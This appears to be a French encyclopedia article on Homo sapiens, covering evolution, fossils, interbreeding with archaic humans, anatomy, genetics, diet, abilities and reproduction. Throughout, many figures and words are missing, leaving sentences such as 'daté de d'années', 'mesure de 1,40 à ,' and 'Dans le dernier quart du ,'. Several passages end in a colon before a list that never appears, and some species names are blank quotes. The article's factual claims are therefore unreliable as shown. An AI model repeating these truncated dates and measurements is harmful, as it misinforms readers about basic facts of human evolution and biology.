"Homo sapiens" est aussi appelé « Homme », « Homme moderne », « humain » ou encore « être humain ». Le mot « homme » désigne aussi le mâle adulte, plus prosaïquement qualifié d'individu de sexe masculin. Le terme « femme » pour sa part désigne la femelle adulte. Les termes « garçon » et « fille » désignent respectivement le mâle et la femelle à leur stade infantile, et le terme « adolescent(e) » les désigne à leur stade pubère. «  », « mère », « fils » et « fille » renvoient indifféremment à l'individu jeune ou adulte lorsque l'accent est mis sur la parentalité ou la filiation.
On emploie aussi le terme « humanité », au singulier, pour désigner l'espèce humaine dans son ensemble.
Dans le dernier quart du , l'espèce "Homo sapiens" a parfois été subdivisée en deux sous-espèces, l'Homme moderne dit "Homo sapiens sapiens" et l'Homme de Néandertal dit "Homo sapiens neanderthalensis". Le consensus actuel classe à nouveau les deux groupes humains dans deux espèces séparées, l'Homme de Néandertal étant désormais dit "Homo neanderthalensis", ce qui rend inutile le recours à une dénomination trinominale pour "Homo sapiens". Si, à l'avenir, une véritable sous-espèce d"'Homo sapiens" est découverte, l'Homme moderne pourra retrouver une dénomination trinominale (avec ou non "sapiens" comme troisième terme).
Classification phylogénétique.
"Homo sapiens" fait partie, comme toute autre espèce du vivant, de plusieurs groupes emboîtés en cascade, dont chacun est caractérisé par un ou plusieurs caractères dérivés, qui s'ajoutent ou remplacent des caractères ancestraux.
Dans la classe des mammifères, l'espèce "" fait partie des :
Les grands singes génétiquement les plus proches de l'Homme moderne sont les deux espèces de Chimpanzés : "Pan troglodytes" (le Chimpanzé commun) et "Pan paniscus" (le Bonobo). Le génome de l'Homme moderne (d'une longueur approximative de de paires de nucléotides) ne diffère que de 1,2 % de celui des chimpanzés (soit quand même de paires de nucléotides).
Selon la plupart des paléoanthropologues, la divergence entre Hominina et Panina (lignée des chimpanzés) remonterait à au moins d'années.
Histoire évolutive.
Des Hominina au genre "Homo".
Les plus anciens Hominina identifiés à ce jour sont "Sahelanthropus tchadensis", daté de d'années, découvert en 2001 au Tchad, et "Orrorin tugenensis", daté de 6 millions d'années, découvert en 2000 au Kenya. Les Grécopithèques, représentés par deux fossiles datés de plus de d'années pourraient aussi figurer parmi les Hominina. Plus récemment, une nouvelle espèce découverte en 2015, "Danuvius guggenmosi", présente des similarités avec les Hominina ; elle vivait en Allemagne il y a d'années.
Le genre Australopithèque, apparu vers d'années en Afrique de l'Est, a formé de nombreuses espèces en Afrique, du Pliocène jusqu'au début du Pléistocène. La découverte de l'australopithèque Lucy en 1974 en Éthiopie, datée de d'années, à la bipédie affirmée mais dotée d'un cerveau de faible volume (seulement légèrement plus gros que celui des chimpanzés), a confirmé, après l'enfant de Taung découvert en 1924 en Afrique du Sud, que la bipédie était de loin plus ancienne que l'augmentation du volume cérébral. Des empreintes de pas fossilisées datant de 3,66 Ma, trouvées à Laetoli en Tanzanie, montrent cependant une bipédie encore archaïque chez les Australopithèques.
Il y a près de 3 millions d'années, en réaction à un probable assèchement du climat en Afrique de l'Est, il semble se produire une divergence évolutive, donnant d'un côté les Paranthropes et de l'autre le genre "Homo". La sélection naturelle pourrait avoir joué un rôle significatif par l'adaptation à un couvert végétal de moins en moins arboré.
D"Homo habilis" à "Homo sapiens".
Le plus ancien fossile attribué au genre "Homo" (découvert en 2013 en Éthiopie et désigné sous le code LD 350-1) est une mandibule fragmentaire datée d'environ d'années. Elle montre des caractères intermédiaires entre les Australopithèques et "Homo habilis".
À partir d'environ 2 millions d'années, les fossiles d"'Homo ergaster" attestent d'une bipédie devenue exclusive, avec des membres antérieurs nettement plus courts que les membres postérieurs et la présence d'une voûte plantaire. Les jambes sont plus longues que la hauteur du torse et adaptées à la marche d'endurance et à la course. Des traces de pas comparables à celles de l'Homme moderne et datant de 1,51 à 1,52 million d'années ont notamment été trouvées à Ileret, au Kenya.
De manière générale, tout au long de l'évolution humaine, le squelette devient de plus en plus gracile, alors que les Homo archaïques ont des squelettes robustes.
L'évolution vers "Homo sapiens" se caractérise par les éléments suivants :
L'un des éléments caractérisant le processus évolutif ayant accompagné l'émergence d’"Homo sapiens" serait la néoténie, c'est-à-dire une modification héréditaire du phénotype consistant en une persistance de caractères juvéniles à l'âge adulte. Certaines caractéristiques de la physiologie et de l'éthologie humaine actuelles seraient directement liées à la néoténie.
L'enchaînement des différentes espèces humaines depuis quelque d'années demeure un sujet de débat chez les spécialistes, faute de fossiles en nombre suffisant qui puissent permettre de proposer une phylogénie consensuelle. Seules les espèces humaines les plus récentes peuvent faire l'objet d'hypothèses sérieuses, notamment grâce aux récentes avancées de la paléogénétique.
Caractères spécifiques.
Pour les paléoanthropologues, les ossements fossiles du genre "Homo" peuvent être attribués à "Homo sapiens" s'ils présentent un certain nombre de critères distinctifs, dont les plus importants sont un volume endocrânien supérieur à , une face réduite sous la boite crânienne, un angle facial compris entre 82 et (prognathisme faible à nul), un bourrelet sus-orbitaire réduit, et un menton osseux saillant.
Le volume cérébral d"'Homo sapiens", qui est en moyenne aujourd'hui chez l'humain moderne de , était plus élevé au Paléolithique supérieur, sans atteindre toutefois le volume cérébral moyen de l'Homme de Néandertal. La réduction du volume global du cerveau se serait accompagnée d'une réorganisation des aires cérébrales aux conséquences plus importantes que la variation du volume brut.
Fossiles.
Historiquement, les premiers restes fossiles d"Homo sapiens" ont été découverts en 1823 au Pays de Galles : il s'agit de la Dame rouge de Paviland. Puis, des restes ont été découverts en 1829 à Engis, en Belgique, dans les grottes Schmerling, en même temps que les premiers restes néandertaliens. Mais dans les deux cas, ils n'ont pas été reconnus lors de leur découverte comme des restes fossiles d"Homo sapiens". C'est Louis Lartet qui, en mettant au jour en 1868 en Dordogne les fossiles de l'Homme de Cro-Magnon, datés de , fait reconnaître pour la première fois l'ancienneté d"Homo sapiens".
Liste de fossiles.
On a déjà découvert de nombreux fossiles d"'Homo sapiens" plus ou moins archaïques, en Afrique et, de plus en plus, hors d'Afrique. Les fossiles suivants lui sont généralement attribués (non exhaustif) :
En 2015, le site de en Chine a livré 47 dents datées d'au moins et appartenant à "Homo sapiens".
Huit dents trouvées dans la grotte de Qesem, à proximité de Tel Aviv-Jaffa, dont les plus vieilles seraient datées d'environ , auraient éventuellement des affinités avec "Homo sapiens", hypothèse étudiée par M. Gopher et son équipe, mais elles ne peuvent être attribuées de façon certaine.
En 2018 sont découverts sur le site de des fossiles d"Homo sapiens" qui ont colonisé le plateau tibétain, à d'altitude, il y a . Il s’agit de la plus ancienne présence connue d"'Homo sapiens" à haute altitude.
Les fossiles européens les plus anciens sont des fragments d'os et de dents trouvés dans la grotte Mandrin en France et dans la grotte de Bacho Kiro en Bulgarie, datés respectivement à et (cal AP).
Émergence et évolution de l'espèce.
Les études génétiques basées sur la comparaison de l'ADN nucléaire de différentes populations humaines actuelles indiquent que notre espèce "Homo sapiens" se serait constituée en Afrique il y a environ de l'hybridation de deux groupes d'humains ("Homo") qui ont divergé il y a 1,5 million d'années. Le groupe prépondérant (80 %) a connu un goulet d'étranglement démographique dès son émergence (ce qui a pu favoriser son évolution). Il a conduit aux espèces récentes dont la lignée néandersovienne (Néandertaliens et Dénisoviens, qui s'est détachée plus tôt, vers ). Le groupe minoritaire (20 %) aurait joué un rôle clé dans le développement cognitif de notre espèce. Entre à avant le présent on observe un brassage de différentes ramifications d'humains modernes ("Homo sapiens") à travers l'Afrique. Par la suite, "Homo sapiens" aurait quitté l'Afrique principalement entre pour se répandre dans toute l'Eurasie en supplantant les espèces humaines antérieures, Néandertaliens en Europe et Denisoviens en Asie, avec lesquelles ils ont néanmoins pu s'hybrider, ce qui a favorisé leur adaptation aux nouveaux environnements rencontrés. Cette influence néandertalienne s'est ensuite rétrodiffusée en Afrique.
Évolution des théories sur l'émergence d"'Homo sapiens".
La vision de l’émergence d'Homo sapiens a évolué depuis les années 1980. Parmi les différents modèles proposés, on distingue :
Diversité génétique.
La diversité génétique humaine actuelle s'est construite à partir de trois principaux évènements radiatifs en Afrique :
Hybridation avec des humains archaïques.
Plusieurs autres espèces du genre "Homo", l'Homme de Néandertal, l'Homme de Denisova, l'Homme de Florès, ont été contemporaines d’"Homo sapiens", avec lequel certaines d'entre elles ont pu coexister pendant des milliers d'années avant de s'éteindre.
Selon de nombreuses études génétiques publiées depuis 2010, des croisements ont eu lieu entre espèces humaines. On relève en particulier environ 1,8 % d'ADN néandertalien chez les populations non africaines modernes.
Bien qu"'Homo sapiens" et "Homo neanderthalensis" soient désormais considérés comme deux espèces distinctes, il s'est produit une hybridation entre "Sapiens" et "Néandertal" il y a à au Proche-Orient, produisant aujourd'hui un héritage de 1,8 à 2,6 % de gènes néandertaliens chez tous les non-Africains. Le séquençage des humains Ranis13 et de a mis en évidence un seul épisode d'hybridation qui s’est étalé entre AP et concerne l'ensemble des populations outrafricaines.
Depuis, l'ADN néandertalien a pu se rétrodiffuser en Afrique. Certains de ces gènes, sélectionnés positivement par les Africains, améliorent leur immunité ou les protègent contre le rayonnement ultraviolet. Une partie des gènes qu'ils partagent avec les Néandertaliens (0,3 % en moyenne) provient de migrations eurasiatiques relativement récentes. L'autre témoigne en fait d'une transmission de gènes d'Africains à Néandertaliens, probablement il y a plus de au Moyen-Orient lors d'une première tentative d'émigration hors d'Afrique. Cependant, cette affirmation selon laquelle l'ascendance néandertalienne se trouve généralement parmi les Africains subsahariens est contestée par certains généticiens, comme David Reich.
Plusieurs études publiées depuis 2010, basées sur le séquençage de l'ADN nucléaire extrait d'une phalange et de dents dénisoviennes, indiquent que l'Homme de Denisova a contribué à hauteur de 4 à 6 % au génome des Mélanésiens et Aborigènes d'Australie actuels, et aurait été relativement répandu en Asie à la fin du Pléistocène. Une étude de 2014 montre qu'une partie du matériel génétique de Denisova a été sélectionnée chez "Homo sapiens" pour s'adapter à la haute altitude. Un variant du gène EPAS1 provenant des Dénisoviens améliore le transport d'oxygène et est présent uniquement chez les Tibétains et chez les Chinois Han dans une moindre proportion.
Évolution récente et actuelle.
Depuis les premiers "Homo sapiens" archaïques connus, morphologiquement différents des humains actuels, l'espèce a évolué et cette évolution n'a jamais cessé. Notamment :
Les Européens descendent principalement de trois populations ancestrales : les chasseurs-cueilleurs qui ont colonisé le continent il y a environ , les premiers agriculteurs d'Anatolie arrivés en Europe il y a environ et les éleveurs de la steppe pontique-caspienne arrivés il y a environ . En 2022, d'ADN ancien provenant de ces lignées ancestrales ont été analysés à la recherche de régions présentant des allèles de fréquence inhabituellement basse ou élevée, signes d'évolutions anciennes. Ils ont identifié importants au cours des années, liés au stockage des graisses, au métabolisme, à la physiologie de la peau, à l'immunité et aux fonctions neuronales, considérés globalement comme des adaptations à un climat froid. Aucun de ces gènes n'est partagé par une population comparable d'Africains subsahariens, ce qui suggère qu'ils sont apparus après qu"'Homo sapiens" est sorti d'Afrique.
En 2024, plus de datant de jusqu'au Moyen Âge ont été comparés à plus de modernes provenant de la . En séparant les génomes anciens en lignées ancestrales, les chercheurs ont identifié .
Certaines évolutions sont réversibles. Les anciens Anatoliens, par exemple, présentent un complexe majeur d'histocompatibilité (, une région du chromosome 6) très homogène alors que cet ensemble de gènes, codant des protéines impliquées dans l'immunité, est généralement très diversifié (la sélection naturelle favorise cette diversité génétique en raison de la variété des menaces potentielles). Cette homogénéité inaccoutumée est sans doute le signe que ces premiers agriculteurs ont été ravagés par une même maladie. Lorsque les Anatoliens se sont ensuite mélangés à d'autres populations, l'adaptation de a disparu. Des schémas similaires se sont produits au cours des années : à maintes reprises, des pressions de sélection se sont relâchées, et des adaptations autrefois répandues ont été presque entièrement effacées des populations descendantes par le croisement avec d'autres groupes ou la dérive génétique.
Anatomie.
"Homo sapiens" est un hominidé dont la caractéristique physique la plus manifeste est sa station debout : la colonne vertébrale est redressée et les membres antérieurs ne s'appuient pas sur le sol. Il fait partie des très rares mammifères adoptant ce mode de locomotion.
Un humain adulte mesure de 1,40 à , mais cet écart peut s'étendre d'environ à environ , dans les deux extrêmes du nanisme et du gigantisme. La taille est influencée par des facteurs environnementaux, tels que la disponibilité de la nourriture, mais aussi par le caryotype constitutionnel. Ainsi, toutes autres choses égales par ailleurs, les femmes au caryotype 46,XX sont plus petites que les hommes au caryotype 46,XY, qui eux-mêmes sont plus petits que les hommes atteints du syndrome de Klinefelter (47,XXY) ou du syndrome 47,XYY. Les femmes au caryotype 46,XX sont aussi plus petites que les femmes atteintes du syndrome triple X. De façon générale, la taille semble croître avec le nombre de chromosomes sexuels.
Le poids moyen est d'environ . Les données individuelles varient beaucoup autour des moyennes, avec une forte influence de facteurs environnementaux, alimentaires et comportementaux. Les moyennes elles-mêmes varient beaucoup selon les populations et les époques. Les hommes sont en moyenne plus grands que les femmes.
La pilosité humaine est réduite par rapport à celle des autres primates ; elle est essentiellement limitée à certaines parties du corps (cuir chevelu, aisselles et pubis).
La couleur de la peau humaine présente une grande variété (noire, brune, beige ou rosée très claire), liée à la présence plus ou moins abondante de mélanine, un pigment brun filtrant les rayons ultraviolets. La peau humaine est plus foncée dans la zone intertropicale. Cette variété de pigmentation est une adaptation génétique aux différences d'ensoleillement selon les zones géographiques. En Afrique, les albinos ont ainsi un risque accru de cancers de la peau.
L'humain a besoin du soleil pour synthétiser la vitamine D. Plus il s’est trouvé sous des latitudes faiblement ensoleillées, plus sa peau s’est éclaircie, ce qui facilite la production de vitamine D. La peau noire a en revanche un très haut pouvoir filtrant face aux UV. La dépigmentation a suivi la migration des populations humaines vers les zones septentrionales de la planète.
La peau humaine se ride, s’amincit et perd son élasticité avec l’âge (un test consiste à pincer et à tirer légèrement la peau du dessus de la main ouverte et à mesurer le temps qu'elle met pour reprendre son aspect normal une fois relâchée : l’écart entre un sujet jeune et un sujet âgé est d'environ une seconde). Des pratiques à visée ornementale ou rituelle peuvent modifier l'aspect de la peau et y faire apparaître des motifs divers.
Caractères sexuels secondaires : la pilosité est moindre sur le corps féminin, à l'exception notable du cuir chevelu. En effet, le cycle de vie des cheveux est de cinq ans chez la femme, et de trois ans chez l'homme. Les cheveux poussent aussi plus rapidement chez la femme, ce qui, combiné à des facteurs culturels, peut expliquer que sa chevelure soit souvent plus longue que celle de l'homme. La femme a des seins proéminents en dehors même des périodes de gestation et d’allaitement, une tessiture vocale haute, un bassin plus large et un rapport taille / hanche inférieur. La pilosité masculine est généralement chez l'adulte plus abondante, le bassin est étroit, la musculature plus puissante, la voix plus grave, etc. Toute considération ethnique mise à part, la couleur de la peau est plus sombre chez l'homme que chez la femme. Cette différence serait due à l'influence de certains œstrogènes sur la sécrétion de mélanine.
L’humain porte généralement des vêtements, recouvrant presque toujours au moins les parties génitales. Le port de vêtements pourrait, selon une analyse comparative des génomes du pou et du morpion, remonter à environ .
Génétique.
Caryotype.
Les êtres humains ont de chromosomes, dont une paire de chromosomes sexuels XX ou XY. Selon le système XY de détermination sexuelle, les individus de type XY sont mâles et ceux de type XX sont femelles.
Diversité.
Le génome des humains est identique à 99,9%, soit un niveau de similitude qui ne se trouve que rarement chez les mammifères. Cette similitude est explicable par la relative jeunesse de l'espèce et le brassage des populations. Celle-ci est encore plus faible entre eurasiens, sortis d'Afrique il y a moins de . À titre de comparaison, on constate une variation de 1,2% du génome entre humains d'une part, et bonobos et chimpanzés d'autre part.
Plusieurs théories concurrentes de goulot d'étranglement génétique ont été émises depuis les années 1990 afin de tenter d'expliquer la faible diversité génétique de l'humanité actuelle, mais ces théories ne sont pas confirmées par l'état actuel de la science, selon lequel l'effet fondateur suffit à expliquer cette faible diversité.
Une étude, publiée en 2008 dans la revue "Science", a été réalisée sur l'ADN de plus d'un millier d'individus : la comparaison de chez (non apparentés) appartenant à 51 ethnies a estimé que 89% de la variation entre individus était contenue à l'intérieur des populations, pour 9% entre continents et 2% entre populations d'un même continent. La génétique permet donc d'identifier l'origine géographique des individus en se basant sur la présence de mutations sur certains allèles.
L'hétérozygotie diminue au fur et à mesure que la distance avec l'Afrique subsaharienne augmente, ce qui confirme l'origine africaine des humains actuels. Par ailleurs d'une manière générale, plus deux individus sont nés dans des lieux éloignés géographiquement plus ils sont différents génétiquement, à l'exception du continent africain, qui recèle la plus grande diversité génétique entre les individus. Cependant, l'histoire des migrations humaines durant la période historique doit aussi être prise en compte pour pondérer cette règle générale.
Biologie.
Métabolisme.
Par rapport aux autres primates, l'humain serait . On a longtemps pensé que les singes et humains brûlaient leurs calories à la même vitesse et les premières études concernaient en outre des individus au repos.
En 2010 des études métaboliques ont surpris en montrant que l'orang-outan avait un taux métabolique étonnamment faible. Puis en , une étude publiée dans "Nature" révèle qu’un humain moyen consomme chaque jour environ de plus qu’un chimpanzé ou bonobo, de plus qu’un gorille et 820 de plus qu’un orang-outan. Un humain moyen brûle en moyenne 27% d'énergie par jour en plus qu’un chimpanzé. Cet "hypermétabolisme" pourrait être dû au cerveau humain (au moins trois fois plus gros que celui de tous les autres singes et particulièrement énergivore). La même étude montre que l’humain sédentaire est également le plus gras de tous les primates (y compris que les primates sédentaires de zoos). Une autre explication pourrait être que les femmes produisent potentiellement plus de bébés, plus longs à élever et à intervalles plus court que les singes femelles.
Une hypothèse est que le grossissement du cerveau humain, il y a 1,6 million d'années environ se serait accompagné d'une perte de muscles et de longueur d'intestin (par rapport aux autres grands singes) avec un moindre besoin énergétique, une facilité à se tenir debout et courir ; le différentiel pouvant être mis à profit par le cerveau. D’autres ont pensé que la domestication du feu, la cuisson et le partage des aliments ont aussi contribué à cette économie d’énergie au profit du cerveau.
Régime alimentaire.
"Homo sapiens" est omnivore et opportuniste. Un humain végétarien ou zoophage demeure omnivore : l'alimentation humaine est donc une attitude culturelle avant tout, et .
L'humain peut chasser n'importe quelle espèce animale, et est même capable de chasser des animaux normalement considérés comme des superprédateurs. Pour cette raison, il est parfois considéré comme le "superprédateur ultime". Selon des données collectées par l'Organisation des Nations unies pour l'alimentation et l'agriculture entre 1961 et 2009, l'être humain n'est cependant pas haut dans la chaîne alimentaire en raison de son régime omnivore qui comporte une large proportion d'aliments d'origine végétale.
Les humains dans leur ensemble consomment des aliments très diversifiés, qu'ils soient d'origine végétale ou animale. Depuis le Néolithique, la base de leur alimentation est toutefois constituée de féculents, issus en particulier de trois céréales : le blé, le maïs et le riz. Cette propension à consommer des féculents semble être une spécialisation humaine : le taux d'amylase dans la salive humaine est en effet de six à huit fois plus élevé que dans la salive d'autres hominidés tel le chimpanzé. Avant l'essor des céréales au Néolithique, les humains devaient probablement se procurer des féculents par la consommation de tubercules. Cet usage s'est conservé jusqu'à nos jours, notamment depuis l'expansion de la pomme de terre après l'échange colombien.
Une particularité de l'alimentation humaine est que la plupart des aliments sont cuits, en particulier la viande. Parce qu'elle accélère le processus de digestion, et permet ainsi d'accroître l'apport énergétique alimentaire, la cuisson semble avoir joué un rôle essentiel dans le développement particulièrement prononcé du cerveau humain. La cuisson améliore aussi l'innocuité microbiologique des aliments.
Normalement, un adulte présente, comme la plupart des mammifères, une intolérance au lactose. Cependant, une mutation génétique a été sélectionnée plusieurs fois il y a 6000 à dans certaines régions d'Europe, d'Asie, et d'Afrique, en raison de l'essor de l'élevage laitier dans ces régions. De nos jours, environ 15 % de la population mondiale (mais avec de grandes disparités régionales) présente à l'âge adulte une tolérance au lactose sous forme de lait. La plupart des adultes sont cependant capables de consommer des fromages, dont la production est une pratique très ancienne. Il semble que la consommation de fromage a contribué à sélectionner la tolérance au lactose.
"Homo sapiens" possède une appétence prononcée pour certaines saveurs, notamment le salé et le sucré. Le sel et le sucre sont normalement présents en faibles quantités dans la nature, mais depuis peu, il est capable d'en produire en quantités industrielles et à faible coût. Cet écart entre l'appétence pour ces substances et leur abondance est l'un des facteurs à l'origine de problèmes de santé tels que l'obésité, l'hypertension artérielle ou le diabète, et ce, principalement chez les individus disposant d'un niveau de vie relativement faible, mais tout de même suffisamment élevé, d'un point de vue anthropologique, pour avoir accès aux productions industrielles.
Dès le Néolithique, la plupart des sociétés humaines ont fait fermenter des jus de fruits divers ou autres solutions végétales, afin d'en obtenir une boisson alcoolisée. L'alcool a en effet longtemps été le moyen le plus simple d'assurer l'asepsie des boissons, et de permettre le transport de l'eau sur de longues distances, ou son stockage pendant de longues périodes.
L'ensemble des habitudes alimentaires et arts culinaires de chaque culture est regroupé sous le terme de gastronomie.
Aptitudes physiques.
Contrairement à la plupart des autres hominoïdes, l'être humain n'est que peu apte à la brachiation. Seul un individu jeune et en bonne santé peut, après entraînement, effectuer ce type de locomotion. L'anatomie humaine conserve cependant les caractéristiques associées que sont la flexibilité des épaules permettant de lever les bras au-dessus du corps, ainsi que les mains préhensiles.
Il est en revanche spécialisé dans la bipédie, dont il maîtrise parfaitement les deux allures : la marche et la course. Sa marche est plantigrade, mais sa course peut être digitigrade aux allures les plus rapides. Il marche à une vitesse de 5 à 6 km/h, et peut courir jusqu'à une vitesse d'environ , ce qui est particulièrement lent en comparaison de nombreuses espèces de mammifères terrestres, comme le guépard.
En effet, "Homo sapiens" ne se distingue pas par la vitesse mais par l'endurance. La marche et la course sur de longues distances sont favorisées par l'absence de pelage, qui contribue à la thermorégulation en favorisant la sudation. Cette aptitude à la marche et à la course était probablement déjà présente il y a plus de 1,5 million d'années chez "Homo ergaster" en Afrique.
"Homo sapiens" partage son endurance avec plusieurs espèces de canidés, dont le loup et le chien qui en est issu. Mais il a dans ce domaine l'avantage sur la plupart des mammifères herbivores, ce qui lui permet de pratiquer avec succès la chasse à l'épuisement sur des animaux comme les cerfs ou les antilopes. Cette faculté à parcourir de longues distances aisément a aussi pu faciliter les échanges entre les tribus humaines, comme c'est le cas aujourd'hui chez les Tarahumaras.
Occasionnellement et selon les situations, il peut ramper, grimper, sauter. L'humain semble aussi avoir des prédispositions naturelles à la nage (absence de pilosité, étanchéité parfaite des lèvres fermées, verticalité des fosses nasales, contrôle efficace de la respiration, etc.), et même à l'apnée : il manifeste par exemple un réflexe bradycarde à l'immersion, et ses poumons peuvent recevoir un afflux supplémentaire de sang afin de compenser l'excès de pression à partir de 30 mètres. Ce phénomène, appelé , a longtemps été cru limité aux seuls mammifères aquatiques. Ces prédispositions font partie des éléments qui appuient l'hypothèse d'un passage transitoire à un mode de vie aquatique ou semi-aquatique au cours de l'hominisation.
L'être humain est particulièrement apte au lancer de projectiles divers, notamment par rapport aux autres hominidés. Selon des chercheurs de l'université Harvard, cette aptitude exceptionnelle résulte des évolutions de son anatomie : taille souple entre le bassin et la cage thoracique, positionnement bas des épaules, légère torsion de l'humérus. Cette aptitude au lancer aurait joué un « rôle clé » dans l'évolution humaine.
Les aptitudes physiques de l’être humain présentent un dimorphisme sexuel, la puissance musculaire des femmes étant généralement inférieure à celles des hommes. À titre indicatif, l'actuel record du monde de l'épreuve féminine du 100 mètres est en 10 49, contre 9 58 pour l'épreuve masculine, soit une différence de 91 centièmes de seconde.
Aptitudes cognitives.
De tous les animaux à système nerveux central, "Homo" est probablement celui qui a le cerveau le plus développé et performant. Ses seuls rivaux dans ce domaine sont certains cétacés. D'un point de vue anatomique, ces capacités cognitives sont associées au développement particulièrement prononcé du néocortex, bien que certaines expériences suggèrent que des différences au niveau neuronal jouent aussi un rôle. Le développement particulièrement prononcé du néocortex par rapport aux autres primates et hominidés a été associé à une famille de gènes ancestraux NOTCH2NL.
Les capacités de l'esprit humain notamment en termes de mémoire, d'imagination et d'abstraction sont probablement ce qui explique le mieux le succès évolutif de l'espèce.
"" est capable d’appréhender les règles qui organisent le monde qui l’entoure, de près comme de loin : du mouvement des astres aux lois qui structurent la matière, en passant par les règles qui organisent l’espace et les principes nécessaires à l’induction. Plus précisément, on peut dire que, depuis le milieu du , il comprend les règles du monde visible, à l’exception de celles qui sont à l’origine des forces subatomiques, et des raisons qui font que la matière courbe l’espace-temps. En effet, selon le prix Nobel de physique Richard Feynman, ces deux domaines sont les seuls qui ne sont pas couverts par l’électrodynamique quantique.
Cette aptitude à comprendre le monde s'est traduite par l'accumulation d'un ensemble de connaissances appelées « sciences » et le développement d'outils divers appelés « techniques ». L'attitude plus générale qui consiste à clarifier sa pensée et à chercher, à comprendre le monde par-delà les seules considérations matérielles, est quant à elle appelée philosophie.
Cependant, ces savoirs collectifs résultent de l'échange et de la spécialisation, la totalité des connaissances n'étant jamais maîtrisée par un seul individu. Cette dichotomie entre les connaissances individuelles et l'intégralité de la connaissance et de la culture humaine appuie d'ailleurs une conception de la culture comme entité évolutive propre, dont les constituants sont appelés mèmes, et qui évolue avec "Homo sapiens" de façon symbiotique, ou même commensale.
Les capacités cognitives de l'être humain lui permettent d'avoir conscience de lui-même. Comme quelques autres espèces animales, il réussit systématiquement le test du miroir.
Concernant le dimorphisme sexuel, on note quelques différences anatomiques entre les cerveaux féminins et masculins , mais la complexité des interactions fonctionnelles rend difficile la corrélation de différences anatomiques avec des différences cognitives. .
Reproduction.
Le cycle reproductif humain comporte un vocabulaire spécifique par rapport aux autres mammifères :
Procréation.
La puberté se manifeste en moyenne vers l'âge de 12 à . La ménarche intervient chez les jeunes filles vers l'âge de 12 à . Pour les garçons, la capacité à procréer est en théorie continue, de la puberté jusqu'à la fin de la vie. Chez la femme, cette capacité disparaît à la ménopause, qui survient généralement entre 40 et . La ménopause est rare chez les mammifères, y compris chez les primates. Chez les autres femelles de primates, la fertilité diminue généralement progressivement avec l'âge. Une durée de vie longue après la ménopause pourrait être un avantage sélectif acquis au cours de l'hominisation (c'est l' « hypothèse de la grand-mère »). L'andropause chez l'homme n'est pas l'équivalent de la ménopause chez la femme.
Le cycle ovarien dure environ et est marqué par les menstruations. Contrairement à la plupart des femelles de primates, la femme ne manifeste pas de chaleurs et la période de meilleure fécondité n'est donc pas directement décelable par les mâles. Cependant, il est avéré que le comportement des femmes, en particulier lors de la recherche d'un partenaire sexuel, est sensiblement différent pendant l'œstrus. L'homme, quant à lui, serait plus attiré par les femmes en période d'ovulation, en raison de modifications physiques de la femme.
Bien que le coït reste la principale méthode de fécondation, la femme peut avoir recours à des techniques de procréation médicalement assistée, telles que l'insémination artificielle et la fécondation "in vitro", que ce soit dans le cadre de la lutte contre la stérilité, ou pour les femmes célibataires ou en couple homosexuel. Inversement, les êtres humains ont la particularité de pouvoir contrôler et réduire consciemment leur fécondité en empêchant la fécondation lors du coït, par diverses méthodes de contraception. Dans plusieurs endroits du monde, ces pratiques qui tendent à décorréler, de façon unique dans le règne animal, la reproduction de l'activité sexuelle ont un impact drastique sur le taux de fécondité, le rendant inférieur au seuil de renouvellement des générations.
Gestation.
La gestation est appelée grossesse et dure environ neuf mois. Une femme gravide est dite enceinte. La grossesse est le plus souvent monoembryonnaire, même si une grossesse sur quarante est gémellaire. La parturition est appelée accouchement.
L'accouchement s'effectue le plus souvent dans la douleur du fait des contractions utérines, de la dilatation du col de l'utérus et de la distension périnéale. Les difficultés liées à l'accouchement sont parfois associées à l'antagonisme de deux aspects anatomiques propre à l'être humain : la taille croissante du crâne et l'absence de développement concomitant du bassin des femmes attribué à la station debout. Cette hypothèse, appelée , est cependant régulièrement remise en question.
L'accouchement ne se fait pas toujours par voie basse : le recours à la césarienne, pratiquée depuis l'Antiquité, représente parfois plus de 30 % des naissances dans certains pays développés. Par ailleurs, l'être humain est capable, à l'aide de dispositifs techniques divers, d'assurer la survie d'un enfant prématuré à partir d'un âge gestationnel d'environ vingt-cinq semaines.
Croissance.
À la naissance, le bébé est complètement dépendant de sa mère, ce qui constitue une différence notable par rapport aux autres hominidés. La mère peut allaiter son enfant pendant plusieurs années, l'allaitement exclusif couvrant l'intégralité de ses besoins jusqu'à ses 6 mois , date à laquelle démarre généralement le début de la diversification alimentaire. "Homo sapiens" élève généralement sa progéniture au moins jusqu'à la puberté.
Les jeunes naissent avec une masse autour de , et une taille d'environ 50 à , après une gestation de neuf mois. Ils sont totalement dépendants à la naissance, et leur croissance dure plusieurs années. La maturité sexuelle survient entre 12 et . La croissance des garçons continue souvent jusque vers (la croissance se termine vers 21- avec la solidification de la clavicule).
Espérance de vie.
L'espérance de vie à la naissance est très dépendante des conditions matérielles et de la disponibilité de soins médicaux. Elle se situe aujourd'hui autour de dans les pays les plus riches, et est inférieure à dans les plus pauvres notamment à cause d'une mortalité infantile plus forte. Des cas isolés de longévité approchent , et la personne ayant vécu le plus longtemps dont l'âge a pu être vérifié est la Française Jeanne Calment, qui avait et un peu plus de le jour de son décès.
Nuptialité.
Même s'il existe des exceptions, "" possède depuis au moins cinq milliers d'années une forte tendance à la monogamie sociale, et dans une bien moindre mesure, à la monogamie sexuelle. Les couples forment le plus souvent la base de la structure familiale et sociale, s'établissent dès la puberté et durent en général jusqu'à la mort. Cette tendance s'explique par le très fort investissement que nécessitent la protection et l'éducation des enfants, rendant nécessaire d'un point de vue évolutif la cohésion du couple. Il s'agit là encore d'un caractère distinguant l'humain des autres Hominidés. L'espèce humaine est principalement une espèce à stratégie de reproduction de type K.
Psychologie.
Sexualité et amour.
Le sexe-ratio moyen à la naissance observé chez l'être humain est entre 100 et 105, donc, comme chez la plupart des espèces de mammifères, une quasi-symétrie avec un très léger excédent de garçons. Ce léger biais résulte principalement d'une plus grande mortalité des filles pendant la vie intra-utérine ou durant la période néo-natale, alors qu'au moment de la fécondation les probabilités de l'un ou l'autre sexe sont égales.
Les êtres humains, à l'instar des bonobos ou des chimpanzés, peuvent pratiquer le coït de façon ludique ou sociale, ou avoir des pratiques sexuelles à visée non reproductive, comme la masturbation, la sodomie, la sexualité orale, ou les pratiques homosexuelles. Le coït est souvent la manifestation d'un très fort attachement affectif et émotionnel. Il se déroule en général à l'écart du groupe, c'est-à-dire dans l'intimité. Il est le plus souvent nocturne, fait l'objet de préliminaires et peut s'effectuer selon diverses positions.
